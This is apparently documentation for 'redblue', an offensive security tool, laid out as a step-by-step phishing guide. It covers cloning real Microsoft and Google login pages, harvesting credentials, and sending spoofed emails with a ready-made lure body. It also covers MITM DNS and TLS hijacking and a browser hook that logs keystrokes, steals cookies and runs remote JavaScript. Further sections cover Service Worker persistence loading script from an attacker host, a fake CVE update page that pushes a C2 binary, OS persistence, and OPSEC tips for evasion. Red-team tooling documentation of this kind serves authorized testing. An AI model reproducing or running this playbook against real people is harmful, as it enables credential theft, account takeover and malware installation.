# Phishing & Credential Harvesting Guide

> **AUTHORIZED USE ONLY.** Only use these capabilities during authorized penetration testing engagements, CTF competitions, bug bounty programs (within scope), or your own security audits. Always obtain written authorization before testing systems you don't own.

redblue provides a complete end-to-end phishing toolkit that replaces tools like **GoPhish**, **BeEF**, **SET (Social-Engineer Toolkit)**, **Evilginx**, **HiddenEye**, and **King Phisher** -- all from a single binary with zero external dependencies.

This guide covers every phase of a phishing engagement: from cloning a login page, to delivering it via email or MITM, capturing credentials, persisting in the browser with Service Workers, and escalating to full OS-level control through binary delivery.

---

## Table of Contents

- [Architecture Overview](#architecture-overview)
- [Phase 1: Reconnaissance -- Clone the Target](#phase-1-reconnaissance----clone-the-target)
- [Phase 2: Infrastructure -- Choose Your Delivery Method](#phase-2-infrastructure----choose-your-delivery-method)
  - [Method A: Email Phishing + Standalone Harvester](#method-a-email-phishing--standalone-harvester)
  - [Method B: MITM Phishing (Single Stack)](#method-b-mitm-phishing-single-stack)
- [Phase 3: Email Delivery](#phase-3-email-delivery)
  - [Auto-Generated Email Body](#auto-generated-email-body)
  - [Custom HTML Email Body](#custom-html-email-body)
  - [SMTP Protocol Details](#smtp-protocol-details)
- [Phase 4: Credential Capture](#phase-4-credential-capture)
- [Phase 5: Browser Persistence -- RBB Hook & Service Worker](#phase-5-browser-persistence----rbb-hook--service-worker)
  - [The Browser Hook (hook.js)](#the-browser-hook-hookjs)
  - [Service Worker Persistence (sw.js)](#service-worker-persistence-swjs)
  - [How the Service Worker Works](#how-the-service-worker-works)
  - [Managing Hooked Browsers](#managing-hooked-browsers)
- [Phase 6: Binary Delivery & OS Persistence](#phase-6-binary-delivery--os-persistence)
  - [Triggering the Download](#triggering-the-download)
  - [The Fake Update Page](#the-fake-update-page)
  - [From Download to Full Persistence](#from-download-to-full-persistence)
- [Complete Kill Chain](#complete-kill-chain)
- [Attack Scenarios](#attack-scenarios)
  - [Scenario 1: Remote Target (Email + Harvester)](#scenario-1-remote-target-email--harvester)
  - [Scenario 2: Same Network (MITM + Phish Page)](#scenario-2-same-network-mitm--phish-page)
  - [Scenario 3: Maximum Persistence (Full Stack)](#scenario-3-maximum-persistence-full-stack)
- [Built-in Templates](#built-in-templates)
- [Command Reference](#command-reference)
- [Tools Replaced](#tools-replaced)
- [OPSEC Considerations](#opsec-considerations)

---

## Architecture Overview

```
                                ATTACKER INFRASTRUCTURE
  ┌────────────────────────────────────────────────────────────────────┐
  │                                                                    │
  │  ┌──────────────┐    ┌──────────────┐    ┌──────────────────────┐ │
  │  │ Page Cloner  │    │  Credential  │    │  SMTP Client         │ │
  │  │              │───>│  Harvester   │    │  send phishing email │ │
  │  │ clone URL    │    │  serve page  │    │  AUTH PLAIN/LOGIN    │ │
  │  │ inline CSS   │    │  capture     │    │  MIME multipart      │ │
  │  │ inline imgs  │    │  POST data   │    └─────────┬────────────┘ │
  │  │ rewrite form │    └──────┬───────┘              │              │
  │  └──────────────┘           │                      │              │
  │                             │                      │              │
  │  ┌──────────────────────────┴──────────────────┐   │              │
  │  │          RBB Browser C2 Server              │   │              │
  │  │                                             │   │              │
  │  │  /hook.js       → browser hook payload      │   │              │
  │  │  /sw.js         → service worker persist    │   │              │
  │  │  /delivery.html → fake update page          │   │              │
  │  │  /rb            → redblue binary download   │   │              │
  │  │  /poll          → command polling           │   │              │
  │  │  /init          → session registration      │   │              │
  │  │  /admin/*       → zombie management (local) │   │              │
  │  └─────────────────────────┬───────────────────┘   │              │
  │                            │                       │              │
  │  ┌─────────────────────────┴───────────────────┐   │              │
  │  │          MITM Proxy (optional)              │   │              │
  │  │                                             │   │              │
  │  │  DNS hijacking → redirect domain to us      │   │              │
  │  │  TLS interception → fake certificates       │   │              │
  │  │  --phish-page → serve cloned page           │   │              │
  │  │  Hook injection → inject JS into all pages  │   │              │
  │  └─────────────────────────────────────────────┘   │              │
  │                                                    │              │
  └────────────────────────────────────────────────────┘              │
                   ▲                                                  │
                   │ HTTPS                                            │
                   │                                                  ▼
                                VICTIM
  ┌────────────────────────────────────────────────────────────────────┐
  │                                                                    │
  │  1. Receives phishing email (or DNS is hijacked)          <────────┘
  │  2. Clicks link → sees cloned login page
  │  3. Submits credentials ──────────────────────────> CAPTURED
  │  4. Redirected to real site (suspects nothing)
  │  5. Service Worker registered → hook persists on all pages
  │  6. Attacker triggers fake update via C2 → binary downloaded
  │  7. Victim runs binary → C2 agent connects back
  │  8. Agent installs as service → full OS persistence
  │                                                                    │
  └────────────────────────────────────────────────────────────────────┘
```

---

## Phase 1: Reconnaissance -- Clone the Target

Before anything else, you need a convincing login page. The `clone` command fetches a real login page and converts it into a self-contained phishing template.

### Basic Usage

```bash
rb exploit phish clone https://login.microsoftonline.com -o microsoft-login.html
```

### What Happens Under the Hood

| Step | Action | Why |
|---|---|---|
| 1 | Fetches the real HTML from the target URL | Gets the authentic page structure |
| 2 | Downloads all external CSS (`<link rel="stylesheet">`) | Prevents external requests that would leak |
| 3 | Inlines CSS as `<style>` blocks | Page becomes fully self-contained |
| 4 | Converts all `<img>` sources to base64 `data:` URIs | No image requests reach the real server |
| 5 | Rewrites all `<form action="...">` to `{{ACTION_URL}}` | The harvester fills this dynamically at serve time |
| 6 | Ensures `method="POST"` on all forms | Credential data is sent via POST body |
| 7 | Injects `<input type="hidden" name="_redirect" value="{{REDIRECT_URL}}">` | Enables post-capture redirect |
| 8 | Removes `<meta http-equiv="Content-Security-Policy">` tags | Prevents CSP from blocking our script injection |

The result is a **single HTML file** with zero external dependencies that looks identical to the real page.

### Inspect and Customize

```bash
# Check the output size
wc -l microsoft-login.html

# Preview in browser (optional)
rb http serve --port 9999 --dir . &
# Visit http://localhost:9999/microsoft-login.html

# Edit to tweak branding, fix broken elements, add custom JS
vim microsoft-login.html
```

### Tips for Better Clones

- **SPAs (React/Angular/Vue):** These load content dynamically via JavaScript and the static clone may miss it. Instead, manually save the page from a browser (Ctrl+S -> "Webpage, Complete") and use the saved HTML with `--template-file`.
- **Run `clone` right before the engagement** so the CSS/layout matches the current state of the target.
- **Test the clone** in a browser before deploying to verify it looks correct.
- **You can also use built-in templates** if cloning doesn't work well for your target. See [Built-in Templates](#built-in-templates).

### Alternative: Built-in Templates

If you don't need to clone a specific site:

```bash
# List available templates
rb exploit phish templates

# Available Phishing Templates
#   generic     Clean minimal login form - username/password
#   corporate   Corporate SSO-style with gradient branding
#   oauth       OAuth/Google-style sign-in page

# Use directly with serve
rb exploit phish serve --template corporate --port 8080
```

---

## Phase 2: Infrastructure -- Choose Your Delivery Method

You have two main approaches for delivering the phishing page. Choose based on your engagement scenario.

### Method A: Email Phishing + Standalone Harvester

**When to use:** Target is remote, you don't control their DNS, you have an SMTP relay available.

```
Victim receives email → clicks link → your harvester on your domain → captures creds
```

**Setup:**

```bash
# Terminal 1: Start the credential harvester
rb exploit phish serve \
  --template-file microsoft-login.html \
  --redirect https://login.microsoftonline.com \
  --port 8080 \
  --bind 0.0.0.0 \
  --login-path /login \
  --hook
```

Output:

```
 Credential Harvester
  Listening on:    0.0.0.0:8080
  Login page:      http://0.0.0.0:8080/login
  Template:        microsoft-login.html
  Redirect to:     https://login.microsoftonline.com
  Hook injection:  enabled

  [!] AUTHORIZED USE ONLY. Waiting for credentials...
```

**How the harvester works:**

| Route | Method | Behavior |
|---|---|---|
| `/` | GET | 302 redirect to `/login` |
| `/login` | GET | Serves the cloned login page with `{{ACTION_URL}}` replaced by `/login` and `{{REDIRECT_URL}}` replaced by the redirect target |
| `/login` | POST | Parses URL-encoded form body, extracts username/password, logs to console, stores credential, returns 302 redirect to real site |
| `/hook.js` | GET | Serves the RBB browser hook (when `--hook` is used) |

**Harvester flag reference:**

| Flag | Default | Purpose |
|---|---|---|
| `--template` | `generic` | Built-in template name (`generic`, `corporate`, `oauth`) |
| `--template-file` | - | Custom HTML file path (overrides `--template`) |
| `--redirect` | `https://www.google.com` | Where to 302 the victim after credential capture |
| `--port`, `-p` | `8080` | Listen port |
| `--bind` | `0.0.0.0` | Bind address |
| `--login-path` | `/login` | URL path where the form is served and POSTed |
| `--hook` | disabled | Inject RBB browser hook into the served page |
| `--hook-url` | - | External hook.js URL (points to a separate RBB server instead of self-serving) |

### Method B: MITM Phishing (Single Stack)

**When to use:** Target is on the same network, you can control DNS (ARP spoof, rogue DHCP, DNS hijack), or you want the victim to see the **real domain** in the URL bar.

```
Victim visits real domain → DNS hijacked to you → MITM serves cloned page → captures creds
```

This is the most powerful approach because the URL bar shows the legitimate domain.

**Setup:**

```bash
# Terminal 1: RBB C2 server (for hook management)
rb exploit browser serve --port 3000

# Terminal 2: Full MITM stack with phishing page
rb mitm intercept start \
  --target *.microsoftonline.com \
  --proxy-ip 10.0.0.5 \
  --phish-page microsoft-login.html \
  --phish-redirect https://login.microsoftonline.com \
  --phish-paths /,/login,/common/oauth2/authorize \
  --hook-callback http://10.0.0.5:3000
```

**What happens step by step:**

```
Victim                              MITM Proxy (10.0.0.5)           Real Server
  |                                        |                            |
  | 1. DNS: login.microsoftonline.com?     |                            |
  | ─────────────────────────────────────> |                            |
  | <── A: 10.0.0.5 (hijacked)            |                            |
  |                                        |                            |
  | 2. TLS connect to 10.0.0.5:443        |                            |
  | ─────────────────────────────────────> |                            |
  | <── Fake TLS cert (generated by CA)    |                            |
  |                                        |                            |
  | 3. GET /login                          |                            |
  | ─────────────────────────────────────> |                            |
  | <── cloned page + hook.js (inline)     |  (NEVER reaches server)    |
  |                                        |                            |
  | 4. POST /login (username + password)   |                            |
  | ─────────────────────────────────────> |                            |
  |    [CAPTURED] 14:23:07 (via MITM)      |                            |
  |    Username: victim@corp.com           |                            |
  |    Password: S3cur3P@ss!               |                            |
  |                                        |                            |
  | 5. <── 302 redirect to real site       |                            |
  | ──────────────────────────────────────────────────────────────────> |
  |    (victim logs in normally)       <─────────────────────────────── |
```

**MITM phishing flags:**

| Flag | Default | Purpose |
|---|---|---|
| `--phish-page` | - | HTML file path or builtin template name to serve instead of proxying |
| `--phish-redirect` | `https://www.google.com` | Where to redirect after credential capture |
| `--phish-paths` | `/` | Comma-separated paths to intercept (e.g. `/,/login,/signin`) |
| `--hook-callback` | - | RBB server URL; when set, also injects the hook inline into the phish page |
| `--target`, `-t` | (required) | Domain pattern to hijack (e.g. `*.microsoftonline.com`) |
| `--proxy-ip`, `-i` | (required) | Your machine's IP address |

**Other paths not in `--phish-paths` are proxied normally** to the real server, with hook injection if `--hook-path` or `--hook` is also set. This means the victim can navigate the real site normally after credential capture, but with the hook active on every page.

> **Note:** The victim's browser will show a certificate warning unless they trust your CA. Export it with `rb mitm intercept export-ca` and install it on the target, or use techniques like ARP spoofing + HSTS bypass.

---

## Phase 3: Email Delivery

When using Method A (standalone harvester), you need to deliver the phishing link to the target via email.

### Auto-Generated Email Body

The simplest approach -- provide a `--link` and redblue generates a convincing HTML email automatically:

```bash
rb exploit phish email \
  --from "security@corp.example.com" \
  --to "victim@corp.example.com" \
  --smtp-host smtp.your-relay.com:587 \
  --smtp-user your-user \
  --smtp-pass your-pass \
  --subject "Action Required: Verify Your Account" \
  --link "http://10.0.0.5:8080/login" \
  --reply-to "noreply@corp.example.com"
```

This generates a MIME multipart email (text/plain + text/html) with a "Verify Account" button:

```
Dear User,

We detected unusual activity on your account. Please verify
your identity by clicking the button below:

  [ Verify Account ]     ← links to http://10.0.0.5:8080/login

This link will expire in 24 hours.
```

### Custom HTML Email Body

For more convincing emails, write your own HTML. If the value of `--body-html` is a file path that exists, redblue reads it; otherwise it treats it as inline HTML:

```bash
cat > email-body.html << 'EMAILEOF'
<html>
<body style="font-family:Segoe UI,sans-serif;max-width:600px;margin:0 auto;padding:20px">
<img src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b"
     alt="Microsoft" style="height:24px;margin:20px 0">
<h2 style="color:#1a1a1a">Unusual sign-in activity</h2>
<p>We detected a sign-in attempt that seems unusual. If this was you,
   please verify your identity to keep your account secure:</p>
<table style="margin:16px 0;font-size:13px;color:#555">
  <tr><td style="padding:4px 16px 4px 0"><b>Location:</b></td>
      <td>Unknown Location</td></tr>
  <tr><td style="padding:4px 16px 4px 0"><b>Time:</b></td>
      <td>April 7, 2026 03:42 UTC</td></tr>
</table>
<a href="http://10.0.0.5:8080/login"
   style="display:inline-block;background:#0078d4;color:#fff;
   padding:10px 24px;text-decoration:none;border-radius:4px;
   font-size:14px;font-weight:600">Review activity</a>
<p style="margin-top:24px;font-size:12px;color:#888">
   If you did not attempt to sign in, your account may be compromised.
   Please secure it immediately.</p>
<hr style="border:none;border-top:1px solid #eee;margin:24px 0">
<p style="font-size:11px;color:#aaa">
   Microsoft Corporation, One Microsoft Way, Redmond, WA 98052</p>
</body>
</html>
EMAILEOF

rb exploit phish email \
  --from "security@corp.example.com" \
  --to "victim@corp.example.com" \
  --smtp-host smtp.your-relay.com:587 \
  --smtp-user your-user --smtp-pass your-pass \
  --subject "Unusual sign-in activity on your account" \
  --body-html email-body.html
```

### SMTP Protocol Details

redblue implements a full SMTP client from scratch (no external libraries). Here's what it supports:

**Authentication methods:**

| Method | How it works | When to use |
|---|---|---|
| AUTH PLAIN | Single base64-encoded string: `\0username\0password` | Most modern SMTP servers |
| AUTH LOGIN | Two-step base64 exchange (username, then password) | Older SMTP servers |
| None | Omit `--smtp-user` and `--smtp-pass` | Open relays, local SMTP servers |

**Message format:**

- **RFC 2822** compliant headers (From, To, Subject, Date, Message-ID, MIME-Version)
- **MIME multipart/alternative** when both `--body-text` and `--body-html` are provided
- **Single-part** text/plain or text/html when only one is provided
- **Dot-stuffing** (RFC 5321 Section 4.5.2) for lines starting with `.`
- **X-Mailer: redblue** header (can be overridden or stripped)

**The SMTP transaction flow:**

```
Client                          SMTP Server
  |  connect                       |
  |  ───────────────────────────>  |
  |  <── 220 Welcome               |
  |                                |
  |  EHLO redblue.local            |
  |  ───────────────────────────>  |
  |  <── 250-SIZE 52428800         |  (multiline capability response)
  |  <── 250-AUTH PLAIN LOGIN      |
  |  <── 250 OK                    |
  |                                |
  |  AUTH PLAIN <base64>           |
  |  ───────────────────────────>  |
  |  <── 235 Authentication OK     |
  |                                |
  |  MAIL FROM:<attacker@...>      |
  |  ───────────────────────────>  |
  |  <── 250 OK                    |
  |                                |
  |  RCPT TO:<victim@...>          |
  |  ───────────────────────────>  |
  |  <── 250 OK                    |
  |                                |
  |  DATA                          |
  |  ───────────────────────────>  |
  |  <── 354 Start mail input      |
  |                                |
  |  From: attacker@...            |
  |  To: victim@...                |
  |  Subject: ...                  |
  |  MIME-Version: 1.0             |
  |  Content-Type: multipart/...   |
  |  [message body]                |
  |  .                             |  (lone dot = end of message)
  |  ───────────────────────────>  |
  |  <── 250 OK, queued            |
  |                                |
  |  QUIT                          |
  |  ───────────────────────────>  |
  |  <── 221 Bye                   |
```

**Email flag reference:**

| Flag | Required | Description |
|---|---|---|
| `--from`, `-f` | Yes | Sender email address |
| `--to`, `-t` | Yes | Recipient email address |
| `--smtp-host` | Yes | SMTP server in `host:port` format |
| `--smtp-user` | No | SMTP AUTH username |
| `--smtp-pass` | No | SMTP AUTH password |
| `--subject`, `-s` | No | Subject line (default: "Important Notification") |
| `--body-text` | No | Plain text body (inline string or file path) |
| `--body-html` | No | HTML body (inline string or file path) |
| `--link` | No | Auto-generate email body with this phishing link |
| `--reply-to` | No | Reply-To header address |

---

## Phase 4: Credential Capture

Regardless of which delivery method you use (harvester or MITM), when the victim submits the form, credentials are captured and displayed in real time.

**Harvester console output:**

```
[HTTP] 10.0.0.50 POST /login HTTP/1.1

[CAPTURED] 14:23:07
  Username: victim@corp.example.com
  Password: S3cur3P@ss!
  Source:   10.0.0.50
  UA:       Mozilla/5.0 (Windows NT 10.0; Win64; x64) ...
  Total:    1 credential(s) captured
```

**MITM console output:**

```
[CAPTURED] 14:23:07 (via MITM)
  Username: victim@corp.example.com
  Password: S3cur3P@ss!
  Source:   10.0.0.50
  Host:     login.microsoftonline.com
  UA:       Mozilla/5.0 (Windows NT 10.0; Win64; x64) ...
  Total:    1 credential(s) captured
```

**What the victim experiences:**

1. They see the cloned login page (looks identical to the real one)
2. They enter their username and password
3. They click "Sign In"
4. They are **immediately 302 redirected** to the real `https://login.microsoftonline.com`
5. They land on the actual login page, assume it was a loading glitch, log in normally
6. They never suspect anything happened

**Form field detection:**

The harvester recognizes multiple common field names for username and password:

| Username fields | Password fields |
|---|---|
| `username` | `password` |
| `email` | `pass` |
| `user` | `passwd` |
| `login` | |
| `loginfmt` (Microsoft) | |

Any additional form fields are captured as `extra_fields` and displayed in the output.

---

## Phase 5: Browser Persistence -- RBB Hook & Service Worker

After credentials are captured, the victim is redirected. But if you injected the **RBB browser hook** (via `--hook` on the harvester or `--hook-callback` on the MITM), you now have persistent browser control.

### The Browser Hook (hook.js)

The hook is a JavaScript payload that runs in the victim's browser. It provides:

| Module | What it does | Config flag |
|---|---|---|
| **Fingerprinting** | Sends browser info on first load: user-agent, screen, timezone, language, plugins, WebGL renderer | Always active |
| **C2 Polling** | Polls the RBB server every 2-3s for commands to execute | Always active |
| **Command Execution** | Executes arbitrary JavaScript received from the server | Always active |
| **Keylogger** | Captures every keypress with timestamp and target element. Sends in batches of 20. | `keylogger: true` |
| **Form Grabber** | Intercepts all form submissions and captures field values | `form_grabber: true` |
| **Clipboard Monitor** | Captures copy and paste events (limited to 1000 chars) | `clipboard: true` |
| **Service Worker** | Registers a SW that persists the hook across all pages | `service_worker: true` |
| **Binary Delivery** | Adds `_rb.deliver()` command to redirect to fake update page | `delivery: true` |
| **SPA Observer** | Detects single-page-app navigations via MutationObserver | Always active |

**Built-in commands available on hooked browsers via `window._rb`:**

| Command | What it does |
|---|---|
| `window._rb.cookie()` | Returns `document.cookie` |
| `window._rb.storage()` | Returns all localStorage as JSON |
| `window._rb.html()` | Returns first 50KB of page DOM |
| `window._rb.redirect(url)` | Redirects the browser to a URL |
| `window._rb.exec(js)` | Evaluates arbitrary JavaScript via `eval()` |
| `window._rb.alert(msg)` | Shows an alert dialog |
| `window._rb.deliver()` | Redirects to the binary delivery page |

**Hook configuration profiles:**

| Profile | Modules | Use case |
|---|---|---|
| `HookConfig::default()` | Fingerprint + C2 + commands | Lightweight recon |
| `HookConfig::full()` | All modules including SW and delivery | Full engagement |
| `HookConfig::stealth()` | Obfuscated names, slow polling (3s) | Stealth operation |

### Service Worker Persistence (sw.js)

The Service Worker is the key to **persistent browser control without MITM**. Once registered, it survives page navigations, tab closes, and even browser restarts.

**Start the RBB server (which serves everything):**

```bash
rb exploit browser serve --port 3000
```

The server automatically serves all endpoints:

| Endpoint | Content-Type | Description |
|---|---|---|
| `/hook.js` | `application/javascript` | The browser hook payload |
| `/sw.js` | `application/javascript` | The Service Worker script |
| `/delivery.html` | `text/html` | Fake security update page |
| `/rb` | `application/octet-stream` | The redblue binary itself |
| `/init` | POST | Session registration (receives fingerprint) |
| `/poll?id=X` | GET | Command polling for zombie X |
| `/response` | POST | Command result submission |
| `/keylog` | POST | Keylogger data submission |
| `/form` | POST | Form grabber data submission |
| `/clipboard` | POST | Clipboard event submission |
| `/admin/zombies` | GET | List all zombies (localhost only) |
| `/admin/exec` | POST | Queue command for a zombie (localhost only) |

### How the Service Worker Works

```
1. hook.js loads in victim's browser
2. hook.js calls: navigator.serviceWorker.register('/sw.js', {scope: '/'})
3. sw.js installs immediately (skipWaiting)
4. sw.js activates and claims all clients (clients.claim)
5. From now on, sw.js intercepts EVERY fetch event on this origin:

   For HTML navigation requests (page loads):
     a. Fetch the real page from the network
     b. Read the response as text
     c. Inject <script src="http://attacker:3000/hook.js"></script> before </body>
     d. Return the modified response to the browser

   For non-HTML requests:
     Pass through unmodified

Result: Every page the victim visits on this domain automatically re-loads hook.js
```

**Persistence properties:**

| Property | Behavior |
|---|---|
| Page navigation | SW persists -- hook re-injected on every page load |
| Close tab | SW persists -- still active when tab reopens |
| Close browser | SW persists -- reactivates on next visit to the domain |
| Clear cookies | SW persists -- independent of cookie storage |
| Clear cache / site data | SW removed -- this is the only way to kill it |
| Scope | Same origin only (e.g., all pages on `login.microsoftonline.com`) |
| HTTPS requirement | Required (or localhost). MITM with fake cert satisfies this. |

### Managing Hooked Browsers

```bash
# List all connected zombies
rb exploit browser list

# Example output:
#  ID:     a7f3b2c9d1e4
#  IP:     10.0.0.50
#  Page:   /login
#  Host:   login.microsoftonline.com
#  Status: Online

# Execute JavaScript on a specific zombie
rb exploit browser exec -i a7f3b2c9d1e4 -s "document.cookie"

# Steal all cookies
rb exploit browser exec -i a7f3b2c9d1e4 -s "window._rb.cookie()"

# Get localStorage
rb exploit browser exec -i a7f3b2c9d1e4 -s "window._rb.storage()"

# Get page HTML
rb exploit browser exec -i a7f3b2c9d1e4 -s "window._rb.html()"

# Redirect to a URL
rb exploit browser exec -i a7f3b2c9d1e4 -s "window._rb.redirect('https://evil.com')"

# Execute arbitrary JS
rb exploit browser exec -i a7f3b2c9d1e4 -s "window._rb.exec('alert(document.domain)')"

# Trigger binary delivery
rb exploit browser exec -i a7f3b2c9d1e4 -s "window._rb.deliver()"
```

---

## Phase 6: Binary Delivery & OS Persistence

The browser hook gives you control inside the browser sandbox. To escalate to **full OS control**, you need the victim to download and run the redblue binary. This is where the delivery page comes in.

### Triggering the Download

From the C2, redirect the hooked browser to the fake update page:

```bash
rb exploit browser exec -i ZOMBIE_ID -s "window._rb.deliver()"
```

This calls `window.location = 'http://attacker:3000/delivery.html'`, redirecting the victim's browser to the delivery page.

### The Fake Update Page

The delivery page (`/delivery.html`) is a convincing "Critical Security Update Required" dialog that:

1. **Shows a fake CVE alert** ("CVE-2026-1847 - Remote Code Execution") with urgency messaging
2. **Displays a "Download Security Update" button** styled as an official action
3. **On click:** fetches the binary from `/rb` via JavaScript `fetch()`, displays an animated progress bar, then triggers the browser's download dialog via `blob` + `<a download>`
4. **After download:** shows installation instructions ("Open the downloaded file, click Run, the update installs automatically")
5. **Notifies the C2** when the download completes (sends event to `/init`)

The RBB server serves the redblue binary at `/rb` -- this is the same binary running on the attacker's machine. It can be configured as a C2 agent that beacons back.

### From Download to Full Persistence

Once the victim runs the downloaded binary:

```bash
# 1. The binary starts and connects to C2
# (On the victim's machine, the binary beacons to the attacker)

# 2. On the attacker's C2 server, the agent appears:
rb agent c2 shell
# > list
# Agent-001  10.0.0.50  Windows 10  Active

# 3. Install as a persistent service:
# Linux:   systemd service (user-level, no root needed)
# macOS:   launchd plist in ~/Library/LaunchAgents/
# Windows: Registry Run key in HKCU\Software\Microsoft\Windows\CurrentVersion\Run

rb service manage install hooks-server --auto-start
```

**OS-level persistence mechanisms:**

| OS | Method | Location | Requires admin? |
|---|---|---|---|
| Linux | systemd user service | `~/.config/systemd/user/` | No |
| Linux | crontab @reboot | User crontab | No |
| macOS | launchd LaunchAgent | `~/Library/LaunchAgents/` | No |
| macOS | launchd LaunchDaemon | `/Library/LaunchDaemons/` | Yes |
| Windows | Registry Run key | `HKCU\...\Run` | No |
| Windows | Scheduled Task | Task Scheduler | No |

---

## Complete Kill Chain

Here's the full phishing-to-persistence kill chain with every redblue component:

```
Phase 1: RECON
  rb exploit phish clone https://login.target.com -o target-login.html

Phase 2: INFRASTRUCTURE
  rb exploit browser serve --port 3000                    # RBB C2
  rb exploit phish serve --template-file target-login.html \
    --redirect https://login.target.com --port 8080 --hook-url http://attacker:3000/hook.js

Phase 3: DELIVERY
  rb exploit phish email --from it@target.com --to victim@target.com \
    --smtp-host smtp.relay.com:587 --subject "Verify" --link http://attacker:8080/login

Phase 4: CAPTURE
  → Victim clicks link
  → Sees cloned login page
  → Submits credentials        ──> [CAPTURED] username + password
  → Redirected to real site

Phase 5: BROWSER PERSISTENCE
  → hook.js loaded in browser
  → Service Worker registered  ──> Hook persists on ALL pages of that domain
  → Keylogger active           ──> Every keystroke captured
  → Form grabber active        ──> Every form submission captured

Phase 6: BINARY DELIVERY
  rb exploit browser exec -i ZOMBIE -s "window._rb.deliver()"
  → Victim sees "Critical Security Update Required"
  → Downloads binary           ──> /rb served from RBB server
  → Runs binary                ──> Agent beacons to C2

Phase 7: OS PERSISTENCE
  rb service manage install    ──> systemd / launchd / registry
  → Full persistent access achieved
```

---

## Attack Scenarios

### Scenario 1: Remote Target (Email + Harvester)

**Situation:** Target is across the internet. You have an SMTP relay and a VPS.

```bash
# On your VPS (public IP: 203.0.113.10, domain: login-verify.com)

# 1. Clone
rb exploit phish clone https://accounts.google.com -o google-login.html

# 2. Start RBB + Harvester
rb exploit browser serve --port 3000 &
rb exploit phish serve \
  --template-file google-login.html \
  --redirect https://accounts.google.com \
  --port 443 --hook-url http://203.0.113.10:3000/hook.js

# 3. Send email
rb exploit phish email \
  --from security@target.com --to victim@target.com \
  --smtp-host smtp.relay.com:587 --smtp-user user --smtp-pass pass \
  --subject "Unusual sign-in activity" \
  --link https://login-verify.com/login
```

### Scenario 2: Same Network (MITM + Phish Page)

**Situation:** You're on the target's LAN during an internal pentest.

```bash
# 1. Clone
rb exploit phish clone https://portal.corp.internal -o portal-login.html

# 2. Start RBB
rb exploit browser serve --port 3000 &

# 3. MITM with phishing page (DNS hijack + TLS interception + phish)
sudo rb mitm intercept start \
  --target *.corp.internal \
  --proxy-ip 10.0.0.5 \
  --phish-page portal-login.html \
  --phish-redirect https://portal.corp.internal \
  --hook-callback http://10.0.0.5:3000

# No email needed -- victim's normal browsing triggers the phishing page
```

### Scenario 3: Maximum Persistence (Full Stack)

**Situation:** You want credentials + browser persistence + OS persistence.

```bash
# Terminal 1: RBB server (hook, SW, delivery, binary download)
rb exploit browser serve --port 3000

# Terminal 2: MITM with phish page + hook injection on all other pages
sudo rb mitm intercept start \
  --target *.microsoftonline.com \
  --proxy-ip 10.0.0.5 \
  --phish-page microsoft-login.html \
  --phish-redirect https://login.microsoftonline.com \
  --phish-paths /,/login \
  --hook-callback http://10.0.0.5:3000

# Terminal 3: Send phishing email to also catch remote users
rb exploit phish email \
  --from security@corp.com --to victim@corp.com \
  --smtp-host smtp.relay.com:587 \
  --subject "Password Reset Required" \
  --link http://10.0.0.5:8080/login

# Terminal 4: Monitor and escalate
rb exploit browser list                                    # See hooked browsers
rb exploit browser exec -i ZOMBIE -s "window._rb.cookie()" # Steal session
rb exploit browser exec -i ZOMBIE -s "window._rb.deliver()" # Deliver binary

# After victim runs the binary:
rb agent c2 shell                                          # Interact with agent
```

---

## Built-in Templates

Three embedded HTML templates are available when cloning isn't needed or doesn't work:

| Template | Style | Best for |
|---|---|---|
| `generic` | Clean minimal username/password form | Generic engagements, quick tests |
| `corporate` | Corporate SSO with gradient branding and `{{COMPANY_NAME}}` placeholder | Internal corporate targets |
| `oauth` | Google/Microsoft OAuth-style sign-in with colored logo | Cloud service phishing |

```bash
# List templates
rb exploit phish templates

# Use with harvester
rb exploit phish serve --template corporate --port 8080 --redirect https://portal.corp.com

# Use with MITM
rb mitm intercept start --target *.corp.com --proxy-ip 10.0.0.5 --phish-page corporate
```

Templates support these placeholders (replaced at serve time):

| Placeholder | Default | Description |
|---|---|---|
| `{{ACTION_URL}}` | Login path | Form submission target |
| `{{REDIRECT_URL}}` | Redirect URL | Post-capture redirect |
| `{{COMPANY_NAME}}` | "Company Portal" | Company name in corporate template |
| `{{LOGO_URL}}` | (empty) | Logo image URL |

---

## Command Reference

### `rb exploit phish clone <URL> [-o file]`

Clone a real login page. Fetches HTML, inlines CSS/images as base64, rewrites forms.

### `rb exploit phish serve [flags]`

Start credential harvesting server. Serves login page, captures POSTs, redirects victim.

### `rb exploit phish email --from <addr> --to <addr> --smtp-host <host:port> [flags]`

Send phishing email via SMTP. Supports AUTH PLAIN/LOGIN, MIME multipart, auto-generated or custom HTML body.

### `rb exploit phish templates`

List available built-in login page templates.

### `rb exploit phish clone <URL> [-o file]`

Clone a real login page for credential harvesting.

### `rb mitm intercept start --target <domain> --proxy-ip <ip> --phish-page <file> [flags]`

Serve a cloned page directly from the MITM proxy. DNS hijack + TLS interception + credential capture + hook injection in one stack.

### `rb exploit browser serve [--port 3000]`

Start the RBB browser C2 server. Serves hook.js, sw.js, delivery.html, /rb binary, and manages zombie sessions.

### `rb exploit browser list`

List all connected browser zombies with status, IP, page, and host.

### `rb exploit browser exec -i <ZOMBIE_ID> -s <JAVASCRIPT>`

Execute JavaScript on a hooked browser. Use `window._rb.*` commands for common operations.

---

## Tools Replaced

| Traditional Tool | What it does | redblue Equivalent |
|---|---|---|
| **GoPhish** | Email phishing campaigns | `rb exploit phish email` + `rb exploit phish serve` |
| **SET** | Social Engineering Toolkit, site cloner | `rb exploit phish clone` + `rb exploit phish serve` |
| **BeEF** | Browser Exploitation Framework | `rb exploit browser serve` + hook.js + sw.js |
| **Evilginx** | MITM phishing proxy | `rb mitm intercept start --phish-page` |
| **King Phisher** | Phishing campaign management | `rb exploit phish email` with custom HTML templates |
| **HiddenEye** | Phishing page generator | `rb exploit phish clone` + `rb exploit phish serve` |
| **Modlishka** | Reverse proxy phishing | `rb mitm intercept start` (proxy mode) |
| **Gophish + BeEF** | Email + browser exploitation | `rb exploit phish email` + `rb exploit browser serve` |

---

## OPSEC Considerations

| Concern | Mitigation |
|---|---|
| **Domain reputation** | Use a fresh domain aged 1+ weeks; configure SPF, DKIM, and DMARC records |
| **SSL/TLS on harvester** | Run behind a reverse proxy with Let's Encrypt, or use MITM mode |
| **Link inspection** | Use a URL shortener or a legitimate-looking domain; avoid raw IPs in emails |
| **Email headers** | The `X-Mailer: redblue` header is present by default; remove by not using it or customizing |
| **Page freshness** | Run `clone` right before the engagement so the CSS/layout matches the live page |
| **Image hosting** | `clone` inlines all images as base64 data URIs; no external image requests leak |
